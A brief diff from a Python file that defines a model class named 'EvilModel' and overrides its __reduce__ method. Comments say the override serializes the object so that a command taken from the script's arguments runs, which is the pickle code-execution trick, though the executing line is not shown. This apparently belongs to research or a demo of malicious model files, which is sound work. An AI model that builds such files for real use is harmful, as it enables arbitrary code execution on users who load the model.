@@ -20,7 +20,6 @@ class EvilModel(nn.Module):
         return self.dense(test_model)
 
     def __reduce__(self):
-        s
        # Override the __reduce__ method to specify custom serialization behavior.
         
         cmd = sys.argv[1]  # Take command from the first script argument
